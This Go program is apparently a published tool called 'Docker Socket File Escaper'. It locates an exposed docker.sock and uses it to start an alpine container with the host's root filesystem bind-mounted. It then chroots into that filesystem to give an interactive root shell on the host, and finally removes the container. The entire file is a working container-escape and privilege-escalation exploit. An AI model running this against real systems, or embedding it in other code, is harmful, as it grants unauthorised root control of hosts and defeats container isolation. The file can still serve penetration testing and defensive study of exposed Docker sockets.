package main

import (
	"context"
	"errors"
	"io"
	"io/fs"
	"os"
	"path/filepath"

	"github.com/containerd/console"
	"github.com/docker/docker/api/types"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/api/types/mount"
	"github.com/docker/docker/client"
	"github.com/fatih/color"
)

func main() {
	color.Blue("Docker Socket File Escaper")
	color.Blue("Author: @ResulCelik0")
	color.Blue("Github: github.com/ResulCelik0/docker-socket-escape")
	color.Blue("Start...")
	color.Yellow("Searching for docker.sock file...")
	Escape(FindDockerSocketFile())
}

func FindDockerSocketFile() string {
	defPath := "/var/run/docker.sock"
	file, err := os.Stat(defPath)
	if err != nil && err == os.ErrNotExist {
		printError(errors.New("docker socket file not found"))
		color.Yellow("Searching for docker.sock file any path...")
		defPath = FindSockerAnyPath()
	} else if err != nil {
		printError(err)
	} else {
		if file.Mode()&os.ModeSocket != 0 {
			color.Green("[FOUND!] Docker socket file found! default path: /var/run/docker.sock")
		}
		return defPath
	}
	return defPath
}

func FindSockerAnyPath() string {
	realPath := ""
	err := filepath.WalkDir("/", func(path string, d fs.DirEntry, err error) error {
		color.Yellow("[SEARCHING..] Path: ", path)
		if !d.IsDir() {
			info, err := d.Info()
			if err != nil {
				printError(err)
			}
			if info.Name() == "docker.sock" && info.Mode()&os.ModeSocket != 0 {
				color.Green("[FOUND!] Docker socket file found! path: ", path)
				realPath = path
				return nil
			}
		}
		return nil
	})
	if err != nil {
		printError(err)
	}
	return realPath
}

func printError(err error) {
	if err != nil {
		color.Red("[ERROR!]: ", err.Error())
	}
}

func Escape(sockfile string) {
	// var inout chan []byte
	color.Yellow("Escaping...")
	ctx := context.Background()
	cli, err := client.NewClientWithOpts(client.WithHost("unix://" + sockfile))
	if err != nil {
		printError(err)
		return
	}
	defer cli.Close()
	reader, err := cli.ImagePull(ctx, "docker.io/library/alpine", types.ImagePullOptions{})
	if err != nil {
		printError(err)
		return
	}
	defer reader.Close()
	io.Copy(os.Stdout, reader)

	resp, err := cli.ContainerCreate(ctx, &container.Config{
		Image:        "alpine",
		AttachStderr: true,
		AttachStdin:  true,
		Tty:          true,
		AttachStdout: true,
		OpenStdin:    true,
		WorkingDir:   "/",
	}, &container.HostConfig{
		Mounts: []mount.Mount{
			{
				Type:   mount.TypeBind,
				Source: "/",
				Target: "/HostRoot",
			},
		},
	}, nil, nil, "")
	if err != nil {
		printError(err)
		return
	}

	if err := cli.ContainerStart(ctx, resp.ID, types.ContainerStartOptions{}); err != nil {
		printError(err)
		return
	}
	current := console.Current()
	defer current.Reset()

	if err := current.SetRaw(); err != nil {
		printError(err)
		return
	}
	waiter, err := cli.ContainerAttach(ctx, resp.ID, types.ContainerAttachOptions{
		Stderr: true,
		Stdout: true,
		Stdin:  true,
		Stream: true,
	})
	if err != nil {
		printError(err)
		return
	}
	go io.Copy(os.Stdout, waiter.Reader)
	go io.Copy(os.Stderr, waiter.Reader)
	go io.Copy(waiter.Conn, os.Stdin)
	waiter.Conn.Write([]byte("chroot /HostRoot bash\n"))
	waiter.Conn.Write([]byte("clear\n"))
	waiter.Conn.Write([]byte("echo Escaped! You are root now at Host\n"))
	statusCh, errCh := cli.ContainerWait(ctx, resp.ID, container.WaitConditionNotRunning)
	select {
	case err := <-errCh:
		if err != nil {
			printError(err)
			return
		}
	case <-statusCh:
		color.Yellow("Clearing vulnerable container.")
		err := cli.ContainerRemove(ctx, resp.ID, types.ContainerRemoveOptions{
			Force:         true,
			RemoveVolumes: true,
		})
		if err != nil {
			printError(err)
			return
		}
		color.Green("Vulnerable container cleared.")
		color.Green("Bye!")
	}
}
